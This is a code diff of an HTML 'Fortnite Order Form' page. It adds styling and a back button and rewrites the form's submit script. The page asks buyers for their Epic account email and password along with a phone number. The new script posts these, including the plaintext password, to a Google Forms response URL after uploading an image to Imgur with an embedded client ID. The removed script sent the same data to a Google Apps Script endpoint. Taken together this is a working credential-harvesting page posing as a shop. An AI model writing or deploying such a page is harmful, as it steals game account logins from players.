@@ -10,8 +10,31 @@
   <style>
     body {
       background-image: url('images/bg.png'); /* Replace with your image */
+      background-size: cover;
+      background-repeat: no-repeat;
     }
+    .warning {
+      font-size: 0.9em;
+      color: red;
+    }
+    .back-button {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: #007bff;
+            color: white;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .back-button:hover {
+            background-color: #0056b3;
+        }
   </style>
+      <!-- Back Button -->
+      <a href="index.html" class="back-button">Back to Main</a>
   <div class="order-container">
       <h2 class="text-center mb-4">Fortnite Order Form</h2>
       <form id="orderForm">
@@ -63,63 +86,89 @@
       </div>
     </footer>
     <script>
-      document.getElementById('orderForm').addEventListener('submit', async function (e) {
-        e.preventDefault();
+document.getElementById("orderForm").addEventListener("submit", function (event) {
+  event.preventDefault(); // Prevent the default form submission behavior
 
-        const items = Array.from(document.querySelectorAll('.item:checked'))
-          .map(item => item.dataset.name)
-          .join(', ');
-        const total = Array.from(document.querySelectorAll('.item:checked'))
-          .reduce((sum, item) => sum + parseInt(item.value), 0);
-        const phoneNumber = document.getElementById('phoneno').value;
-        const epicEmail = document.getElementById('email').value;
-        const epicPassword = document.getElementById('pass').value;
-        const image = document.getElementById('image').files[0];
+  // Get form data
+  const phone = document.getElementById("phoneno").value;
+  const email = document.getElementById("email").value;
+  const password = document.getElementById("pass").value;
+  const selectedItems = Array.from(document.querySelectorAll('.item:checked'))
+    .map(item => item.dataset.name)
+    .join(', ');
+  const imageFile = document.getElementById("image").files[0];
 
-        let imageURL = '';
-        if (image) {
-          const formData = new FormData();
-          formData.append('image', image);
-          const imgurResponse = await fetch('https://api.imgur.com/3/upload', {
-            method: 'POST',
-            headers: {
-              Authorization: 'Client-ID acf54432c991faf',
-            },
-            body: formData,
-          });
-          const imgurData = await imgurResponse.json();
-          imageURL = imgurData.data.link || '';
-        }
+  // Imgur API upload
+  const imgurClientId = "acf54432c991faf"; // Replace with your Imgur Client ID
+  const imgurUrl = "https://api.imgur.com/3/image";
+  const formDataImgur = new FormData();
+  formDataImgur.append("image", imageFile);
 
-        fetch('https://script.google.com/macros/s/AKfycbxhvzFgI7J5ooVnPI8gAjA-SNO9qZnObcTKf1BxbvrPmOkHkpfqgPEqm3jJNCTd5NY/exec {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            selectedItems: items,
-            total,
-            phoneNumber,
-            epicEmail,
-            epicPassword,
-            imageURL,
-          }),
+  fetch(imgurUrl, {
+    method: "POST",
+    headers: {
+      Authorization: `Client-ID ${imgurClientId}`,
+    },
+    body: formDataImgur,
+  })
+    .then(response => response.json())
+    .then(data => {
+      if (data.success) {
+        const imgurLink = data.data.link;
+
+        // Google Form entry identifiers (replace these with the actual IDs from your form)
+        const googleFormUrl = "https://docs.google.com/forms/d/e/1FAIpQLSck1XF_rIV4dbVEm06tf7f-IOqXY8q0yNTS-Bei99PtZNL7Kg/formResponse";
+        const formDataGoogle = new URLSearchParams();
+        formDataGoogle.append("entry.1043722651", email); // Replace with Epic Email field ID
+        formDataGoogle.append("entry.130715550", password); // Replace with Epic Password field ID
+        formDataGoogle.append("entry.1043804156", imgurLink); // Replace with Image Upload Link field ID
+        formDataGoogle.append("entry.1939314833", selectedItems); // Replace with Selected Items field ID
+        formDataGoogle.append("entry.203536283", phone); // Replace with Phone Number field ID
+
+        // Submit to Google Forms
+        fetch(googleFormUrl, {
+          method: "POST",
+          body: formDataGoogle,
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+          },
         })
           .then(response => {
-            if (!response.ok) throw new Error('Network response was not ok');
-            return response.json();
-          })
-          .then(data => {
-            if (data.status === 'success') {
-              alert('Order submitted successfully!');
-              e.target.reset();
-            } else {
-              alert(`Failed to submit the order: ${data.message}`);
-            }
+            alert("Order submitted successfully!");
           })
           .catch(error => {
-            console.error('Error:', error);
-            alert('Error communicating with the server.');
+            console.error("Error submitting the order:", error);
           });
-      });
+      }
+    })
+    .catch(error => {
+      console.error("Error uploading the image:", error);
+    });
+});
+
+
+      const items = document.querySelectorAll('.item');
+      const selectedItemsElement = document.getElementById('selected-items');
+      const totalElement = document.getElementById('total');
+    
+      // Update total and selected items dynamically
+      function updateOrderSummary() {
+        const selectedItems = Array.from(items)
+          .filter(item => item.checked)
+          .map(item => item.dataset.name);
+        const total = Array.from(items)
+          .filter(item => item.checked)
+          .reduce((sum, item) => sum + parseInt(item.value), 0);
+    
+        selectedItemsElement.textContent = selectedItems.length ? selectedItems.join(', ') : 'None';
+        totalElement.textContent = total;
+      }
+    
+      items.forEach(item => item.addEventListener('change', updateOrderSummary));
+    
+      // Initialize summary
+      updateOrderSummary();
     </script>
+    
 </body>
 </html>
